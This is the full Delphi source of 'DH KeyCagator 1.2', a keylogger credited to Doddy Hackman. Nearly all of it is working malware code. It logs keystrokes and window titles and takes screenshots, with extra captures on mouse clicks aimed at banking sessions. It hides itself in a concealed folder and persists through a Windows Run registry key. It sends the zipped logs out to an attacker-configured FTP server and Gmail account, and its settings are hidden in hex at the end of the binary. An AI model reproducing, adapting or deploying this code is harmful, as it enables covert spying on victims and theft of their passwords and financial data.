// DH KeyCagator 1.2
// (C) Doddy Hackman 2015

program keycagator;

{$APPTYPE GUI}

uses
  SysUtils, Windows, WinInet, ShellApi, Vcl.Graphics, Vcl.Imaging.jpeg,
  sevenzip, IdMessage, IdSMTPBase, IdSMTP, IdAttachment,
  IdAttachmentFile, IdSSLOpenSSL, IdGlobal, IdExplicitTLSClientServerBase;

var
  nombrereal: string;
  rutareal: string;
  yalisto: string;
  registro: HKEY;
  dir: string;
  time: integer;

  dir_hide: string;
  time_screen: integer;
  time_ftp: integer;
  ftp_host: Pchar;
  ftp_user: Pchar;
  ftp_password: Pchar;
  ftp_dir: Pchar;

  mail_online: string;
  time_mail: integer;
  mail_user: string;
  mail_pass: string;
  mail_to: string;

  carpeta: string;
  directorio: string;
  bankop: string;
  dir_normal: string;
  dir_especial: string;
  ftp_online: string;
  screen_online: string;
  activado: string;

  ob: THandle;
  code: Array [0 .. 9999 + 1] of Char;
  nose: DWORD;
  todo: string;

  // Functions

function regex(text: String; deaca: String; hastaaca: String): String;
begin
  Delete(text, 1, AnsiPos(deaca, text) + Length(deaca) - 1);
  SetLength(text, AnsiPos(hastaaca, text) - 1);
  Result := text;
end;

function dhencode(texto, opcion: string): string;
// Thanks to Taqyon
// Based on http://www.vbforums.com/showthread.php?346504-DELPHI-Convert-String-To-Hex
var
  num: integer;
  aca: string;
  cantidad: integer;

begin

  num := 0;
  Result := '';
  aca := '';
  cantidad := 0;

  if (opcion = 'encode') then
  begin
    cantidad := Length(texto);
    for num := 1 to cantidad do
    begin
      aca := IntToHex(ord(texto[num]), 2);
      Result := Result + aca;
    end;
  end;

  if (opcion = 'decode') then
  begin
    cantidad := Length(texto);
    for num := 1 to cantidad div 2 do
    begin
      aca := Char(StrToInt('$' + Copy(texto, (num - 1) * 2 + 1, 2)));
      Result := Result + aca;
    end;
  end;

end;

procedure enviate_esta(username, password, toto, subject, body,
  archivo: string);

// Based on : http://stackoverflow.com/questions/7717495/starttls-error-while-sending-email-using-indy-in-delphi-xe
// Thanks to TLama

var
  data: TIdMessage;
  mensaje: TIdSMTP;
  SSL: TIdSSLIOHandlerSocketOpenSSL;

begin

  mensaje := TIdSMTP.Create(nil);
  data := TIdMessage.Create(nil);
  SSL := TIdSSLIOHandlerSocketOpenSSL.Create(nil);

  SSL.MaxLineAction := maException;
  SSL.SSLOptions.Method := sslvTLSv1;
  SSL.SSLOptions.Mode := sslmUnassigned;
  SSL.SSLOptions.VerifyMode := [];
  SSL.SSLOptions.VerifyDepth := 0;

  data.From.Address := username;
  data.Recipients.EMailAddresses := toto;
  data.subject := subject;
  data.body.text := body;

  if FileExists(archivo) then
  begin
    TIdAttachmentFile.Create(data.MessageParts, archivo);
  end;

  mensaje.IOHandler := SSL;
  mensaje.Host := 'smtp.gmail.com';
  mensaje.Port := 587;
  mensaje.username := username;
  mensaje.password := password;
  mensaje.UseTLS := utUseExplicitTLS;

  mensaje.Connect;
  mensaje.Send(data);
  mensaje.Disconnect;

  mensaje.Free;
  data.Free;
  SSL.Free;

end;

procedure savefile(filename, texto: string);
var
  ar: TextFile;

begin

  try

    begin
      AssignFile(ar, filename);
      FileMode := fmOpenWrite;

      if FileExists(filename) then
        Append(ar)
      else
        Rewrite(ar);

      Write(ar, texto);
      CloseFile(ar);
    end;
  except
    //
  end;

end;

procedure upload_ftpfile(Host, username, password, filetoupload,
  conestenombre: Pchar);

// Credits :
// Based on : http://stackoverflow.com/questions/1380309/why-is-my-program-not-uploading-file-on-remote-ftp-server
// Thanks to Omair Iqbal

var
  controluno: HINTERNET;
  controldos: HINTERNET;

begin

  try

    begin
      controluno := InternetOpen(0, INTERNET_OPEN_TYPE_PRECONFIG, 0, 0, 0);
      controldos := InternetConnect(controluno, Host, INTERNET_DEFAULT_FTP_PORT,
        username, password, INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
      ftpPutFile(controldos, filetoupload, conestenombre,
        FTP_TRANSFER_TYPE_BINARY, 0);
      InternetCloseHandle(controldos);
      InternetCloseHandle(controluno);
    end
  except
    //
  end;

end;

procedure comprimir_logs_para_ftp;
var
  zipnow: I7zOutArchive;
  busqueda: TSearchRec;
  dirnow, guardar: string;
begin

  dirnow := GetCurrentDir;
  guardar := 'logs.zip';

  zipnow := CreateOutArchive(CLSID_CFormat7z);
  SetCompressionLevel(zipnow, 9);
  SevenZipSetCompressionMethod(zipnow, m7LZMA);

  zipnow.AddFile(dirnow + '\logs.html', 'index.html');

  if FindFirst(dirnow + '\*.jpg', faAnyFile, busqueda) = 0 then
  begin
    repeat
      zipnow.AddFile(dirnow + '\' + busqueda.Name, busqueda.Name);
    until FindNext(busqueda) <> 0;
    SysUtils.FindClose(busqueda);
  end;

  zipnow.SaveToFile(guardar);

  SetFileAttributes(Pchar(guardar), FILE_ATTRIBUTE_HIDDEN);

  upload_ftpfile(Pchar(ftp_host), Pchar(ftp_user), Pchar(ftp_password),
    Pchar(dirnow + '/logs.zip'), Pchar(ftp_dir + 'logs.zip'));

  if (FileExists('logs.zip')) then
  begin
    DeleteFile('logs.zip')
  end;

end;

procedure comprimir_logs_para_mail;
var
  zipnow: I7zOutArchive;
  busqueda: TSearchRec;
  dirnow, guardar: string;
begin

  dirnow := GetCurrentDir;
  guardar := 'logs.zip';

  zipnow := CreateOutArchive(CLSID_CFormat7z);
  SetCompressionLevel(zipnow, 9);
  SevenZipSetCompressionMethod(zipnow, m7LZMA);

  zipnow.AddFile(dirnow + '\logs.html', 'index.html');

  if FindFirst(dirnow + '\*.jpg', faAnyFile, busqueda) = 0 then
  begin
    repeat
      zipnow.AddFile(dirnow + '\' + busqueda.Name, busqueda.Name);
    until FindNext(busqueda) <> 0;
    SysUtils.FindClose(busqueda);
  end;

  zipnow.SaveToFile(guardar);

  SetFileAttributes(Pchar(guardar), FILE_ATTRIBUTE_HIDDEN);

  enviate_esta(mail_user, mail_pass, mail_to, 'Logs', 'Enjoy the logs',
    Pchar(dirnow + '/logs.zip'));

  if (FileExists('logs.zip')) then
  begin
    DeleteFile('logs.zip')
  end;

end;

procedure capturar_pantalla(nombre: string);

// Function capturar() based in :
// http://forum.codecall.net/topic/60613-how-to-capture-screen-with-delphi-code/
// http://delphi.about.com/cs/adptips2001/a/bltip0501_4.htm
// http://stackoverflow.com/questions/21971605/show-mouse-cursor-in-screenshot-with-delphi
// Thanks to Zarko Gajic , Luthfi and Ken White

var
  aca: HDC;
  tan: TRect;
  posnow: TPoint;
  imagen1: TBitmap;
  imagen2: TJpegImage;
  curnow: THandle;

begin

  aca := GetWindowDC(GetDesktopWindow);
  imagen1 := TBitmap.Create;

  GetWindowRect(GetDesktopWindow, tan);
  imagen1.Width := tan.Right - tan.Left;
  imagen1.Height := tan.Bottom - tan.Top;
  BitBlt(imagen1.Canvas.Handle, 0, 0, imagen1.Width, imagen1.Height, aca, 0,
    0, SRCCOPY);

  GetCursorPos(posnow);

  curnow := GetCursor;
  DrawIconEx(imagen1.Canvas.Handle, posnow.X, posnow.Y, curnow, 32, 32, 0, 0,
    DI_NORMAL);

  imagen2 := TJpegImage.Create;
  imagen2.Assign(imagen1);
  imagen2.CompressionQuality := 60;
  imagen2.SaveToFile(nombre);

  imagen1.Free;
  imagen2.Free;

end;

//

procedure capturar_teclas;

var
  I: integer;
  Result: Longint;
  mayus: integer;
  shift: integer;
  banknow: string;

const

  n_numeros_izquierda: array [1 .. 10] of string = ('48', '49', '50', '51',
    '52', '53', '54', '55', '56', '57');

const
  t_numeros_izquierda: array [1 .. 10] of string = ('0', '1', '2', '3', '4',
    '5', '6', '7', '8', '9');

const
  n_numeros_derecha: array [1 .. 10] of string = ('96', '97', '98', '99', '100',
    '101', '102', '103', '104', '105');

const
  t_numeros_derecha: array [1 .. 10] of string = ('0', '1', '2', '3', '4', '5',
    '6', '7', '8', '9');

const
  n_shift: array [1 .. 22] of string = ('48', '49', '50', '51', '52', '53',
    '54', '55', '56', '57', '187', '188', '189', '190', '191', '192', '193',
    '291', '220', '221', '222', '226');

const
  t_shift: array [1 .. 22] of string = (')', '!', '@', '#', '\$', '%', '¨', '&',
    '*', '(', '+', '<', '_', '>', ':', '\', ' ? ', ' / \ ', '}', '{', '^', '|');

const
  n_raros: array [1 .. 17] of string = ('1', '8', '13', '32', '46', '187',
    '188', '189', '190', '191', '192', '193', '219', '220', '221',
    '222', '226');

const
  t_raros: array [1 .. 17] of string = ('[mouse click]', '[backspace]',
    '<br>[enter]<br>', '[space]', '[suprimir]', '=', ',', '-', '.', ';', '\',
    ' / ', ' \ \ \ ', ']', '[', '~', '\/');

begin

  while (1 = 1) do
  begin

    Sleep(time); // Time

    try

      begin

        // Others

        for I := Low(n_raros) to High(n_raros) do
        begin
          Result := GetAsyncKeyState(StrToInt(n_raros[I]));
          If Result = -32767 then
          begin
            savefile('logs.html', t_raros[I]);
            if (bankop = '1') then
            begin
              if (t_raros[I] = '[mouse click]') then
              begin
                banknow := IntToStr(Random(10000)) + '.jpg';
                capturar_pantalla(banknow);
                SetFileAttributes(Pchar(dir + '/' + banknow),
                  FILE_ATTRIBUTE_HIDDEN);

                savefile('logs.html', '<br><br><center><img src=' + banknow +
                  '></center><br><br>');

              end;
            end;
          end;
        end;

        // SHIFT

        if (GetAsyncKeyState(VK_SHIFT) <> 0) then
        begin

          for I := Low(n_shift) to High(n_shift) do
          begin
            Result := GetAsyncKeyState(StrToInt(n_shift[I]));
            If Result = -32767 then
            begin
              savefile('logs.html', t_shift[I]);
            end;
          end;

          for I := 65 to 90 do
          begin
            Result := GetAsyncKeyState(I);
            If Result = -32767 then
            Begin
              savefile('logs.html', Chr(I + 0));
            End;
          end;

        end;

        // Numbers

        for I := Low(n_numeros_derecha) to High(n_numeros_derecha) do
        begin
          Result := GetAsyncKeyState(StrToInt(n_numeros_derecha[I]));
          If Result = -32767 then
          begin
            savefile('logs.html', t_numeros_derecha[I]);
          end;
        end;

        for I := Low(n_numeros_izquierda) to High(n_numeros_izquierda) do
        begin
          Result := GetAsyncKeyState(StrToInt(n_numeros_izquierda[I]));
          If Result = -32767 then
          begin
            savefile('logs.html', t_numeros_izquierda[I]);
          end;
        end;

        // MAYUS

        if (GetKeyState(20) = 0) then
        begin
          mayus := 32;
        end
        else
        begin
          mayus := 0;
        end;

        for I := 65 to 90 do
        begin
          Result := GetAsyncKeyState(I);
          If Result = -32767 then
          Begin
            savefile('logs.html', Chr(I + mayus));
          End;
        end;
      end;
    except
      //
    end;

  end;
end;

procedure capturar_ventanas;
var
  ventana1: array [0 .. 255] of Char;
  nombre1: string;
  Nombre2: string; //
begin
  while (1 = 1) do
  begin

    try

      begin
        Sleep(time); // Time

        GetWindowText(GetForegroundWindow, ventana1, sizeOf(ventana1));

        nombre1 := ventana1;

        if not(nombre1 = Nombre2) then
        begin
          Nombre2 := nombre1;
          savefile('logs.html', '<hr style=color:#00FF00><h2><center>' + Nombre2
            + '</h2></center><br>');
        end;

      end;
    except
      //
    end;
  end;

end;

procedure capturar_pantallas;
var
  generado: string;
begin
  while (1 = 1) do
  begin

    Sleep(time_screen);

    generado := IntToStr(Random(10000)) + '.jpg';

    try

      begin
        capturar_pantalla(generado);
      end;
    except
      //
    end;

    SetFileAttributes(Pchar(dir + '/' + generado), FILE_ATTRIBUTE_HIDDEN);

    savefile('logs.html', '<br><br><center><img src=' + generado +
      '></center><br><br>');

  end;
end;

procedure subirftp;
begin
  while (1 = 1) do
  begin

    try

      begin
        Sleep(time_ftp);
        comprimir_logs_para_ftp;
      end;
    except
      //
    end;
  end;
end;

procedure enviar_mail;
begin
  while (1 = 1) do
  begin
    try
      begin
        Sleep(time_mail);
        comprimir_logs_para_mail;
      end;
    except
      //
    end;
  end;
end;

procedure control;
var
  I: integer;
  re: Longint;
begin

  while (1 = 1) do
  begin

    try

      begin

        Sleep(time);

        if (GetAsyncKeyState(VK_SHIFT) <> 0) then
        begin

          re := GetAsyncKeyState(120);
          If re = -32767 then
          Begin

            ShellExecute(0, nil, Pchar(dir + 'logs.html'), nil, nil,
              SW_SHOWNORMAL);

          End;
        end;
      end;
    except
      //
    end;
  End;
end;

//

begin

  try

    // Config

    try

      begin

        // Edit

        ob := INVALID_HANDLE_VALUE;
        code := '';

        ob := CreateFile(Pchar(paramstr(0)), GENERIC_READ, FILE_SHARE_READ, nil,
          OPEN_EXISTING, 0, 0);
        if (ob <> INVALID_HANDLE_VALUE) then
        begin
          SetFilePointer(ob, -9999, nil, FILE_END);
          ReadFile(ob, code, 9999, nose, nil);
          CloseHandle(ob);
        end;

        todo := regex(code, '[63686175]', '[63686175]');
        todo := dhencode(todo, 'decode');

        if not(todo = '') then
        begin
          dir_especial := Pchar(regex(todo, '[opsave]', '[opsave]'));
          directorio := regex(todo, '[save]', '[save]');
          carpeta := regex(todo, '[folder]', '[folder]');
          bankop := regex(todo, '[bank]', '[bank]');
          screen_online := regex(todo, '[capture_op]', '[capture_op]');
          time_screen := StrToInt(regex(todo, '[capture_seconds]',
            '[capture_seconds]'));
          ftp_online := Pchar(regex(todo, '[ftp_op]', '[ftp_op]'));
          time_ftp := StrToInt(regex(todo, '[ftp_seconds]', '[ftp_seconds]'));
          ftp_host := Pchar(regex(todo, '[ftp_host]', '[ftp_host]'));
          ftp_user := Pchar(regex(todo, '[ftp_user]', '[ftp_user]'));
          ftp_password := Pchar(regex(todo, '[ftp_pass]', '[ftp_pass]'));
          ftp_dir := Pchar(regex(todo, '[ftp_path]', '[ftp_path]'));

          mail_online := regex(todo, '[mail_op]', '[mail_op]');
          time_mail := StrToInt(regex(todo, '[mail_seconds]',
            '[mail_seconds]'));
          mail_user := regex(todo, '[mail_user]', '[mail_user]');
          mail_pass := regex(todo, '[mail_pass]', '[mail_pass]');
          mail_to := regex(todo, '[mail_to]', '[mail_to]');

          dir_normal := dir_especial;

          time := 100; // Not Edit

          if (dir_normal = '1') then
          begin
            dir_hide := directorio;
          end
          else
          begin
            dir_hide := GetEnvironmentVariable(directorio) + '/';
          end;

          dir := dir_hide + carpeta + '/';

          if not(DirectoryExists(dir)) then
          begin
            CreateDir(dir);
          end;

          ChDir(dir);

          nombrereal := ExtractFileName(paramstr(0));
          rutareal := dir;
          yalisto := dir + nombrereal;

          MoveFile(Pchar(paramstr(0)), Pchar(yalisto));
          MoveFile(Pchar(ExtractFileDir(paramstr(0)) + '/' + '7z.dll'),
            Pchar(dir + '/' + '7z.dll'));

          SetFileAttributes(Pchar(dir), FILE_ATTRIBUTE_HIDDEN);
          SetFileAttributes(Pchar(yalisto), FILE_ATTRIBUTE_HIDDEN);
          SetFileAttributes(Pchar(dir + '/' + '7z.dll'), FILE_ATTRIBUTE_HIDDEN);

          savefile(dir + '/logs.html', '');

          SetFileAttributes(Pchar(dir + '/logs.html'), FILE_ATTRIBUTE_HIDDEN);

          savefile('logs.html',
            '<style>body {background-color: black;color:#00FF00;cursor:crosshair;}</style>');

          try
            begin
              RegCreateKeyEx(HKEY_LOCAL_MACHINE,
                'Software\Microsoft\Windows\CurrentVersion\Run\', 0, nil,
                REG_OPTION_NON_VOLATILE, KEY_WRITE, nil, registro, nil);
              RegSetValueEx(registro, 'uberk', 0, REG_SZ, Pchar(yalisto), 666);
              RegCloseKey(registro);
            end;
          except
            //
          end;

          // Start the party

          BeginThread(nil, 0, @capturar_teclas, nil, 0, PDWORD(0)^);
          BeginThread(nil, 0, @capturar_ventanas, nil, 0, PDWORD(0)^);

          if (screen_online = '1') then
          begin
            BeginThread(nil, 0, @capturar_pantallas, nil, 0, PDWORD(0)^);
          end;
          if (ftp_online = '1') then
          begin
            BeginThread(nil, 0, @subirftp, nil, 0, PDWORD(0)^);
          end;

          if (mail_online = '1') then
          begin
            BeginThread(nil, 0, @enviar_mail, nil, 0, PDWORD(0)^);
          end;

          BeginThread(nil, 0, @control, nil, 0, PDWORD(0)^);

          // Readln;

          while (1 = 1) do
            Sleep(time);

        end
        else
        begin
          // Writeln('[-] Offline')
        end;

      end;
    except
      //
    end;

    // End

  except
    //
  end;

end.

// The End ?
